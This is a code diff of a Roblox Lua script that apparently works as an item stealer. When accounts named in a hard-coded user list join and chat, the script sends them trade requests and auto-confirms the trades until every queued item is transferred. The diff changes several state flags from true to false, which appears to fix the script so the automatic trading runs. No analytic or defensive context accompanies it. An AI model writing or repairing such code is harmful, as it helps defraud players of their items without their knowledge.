@@ -33,7 +33,7 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
 end
 
 local itemsToSend = {}
-local inTrade = true
+local inTrade = false
 local playerGui = plr:WaitForChild("PlayerGui")
 local tradeFrame = playerGui.TradeApp.Frame
 local dialog = playerGui.DialogApp.Dialog
@@ -354,7 +354,7 @@ tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
     if tradeFrame.Visible then
         inTrade = true
     else
-        inTrade = true
+        inTrade = false
     end
 end)
 
@@ -390,7 +390,7 @@ if #itemsToSend > 0 then
 
     local function doTrade(joinedUser)
         while #itemsToSend > 0 do
-            local tradeRequestSent = true 
+            local tradeRequestSent = false
             if not inTrade and not tradeRequestSent then
                 SendTrade:FireServer(game.Players[joinedUser])
                 tradeRequestSent = true
@@ -404,7 +404,7 @@ if #itemsToSend > 0 then
                     wait(0.1)
                     ConfirmTradeRemote:FireServer()
                 until not inTrade
-                tradeRequestSent = true
+                tradeRequestSent = false
             end
             wait(1)
         end
@@ -412,7 +412,7 @@ if #itemsToSend > 0 then
     end
 
     local function waitForUserChat()
-        local sentMessage = true
+        local sentMessage = false
         local function onPlayerChat(player)
             if table.find(users, player.Name) then
                 player.Chatted:Connect(function()
@@ -428,4 +428,6 @@ if #itemsToSend > 0 then
         Players.PlayerAdded:Connect(onPlayerChat)
     end
     waitForUserChat()
+end
+
 end
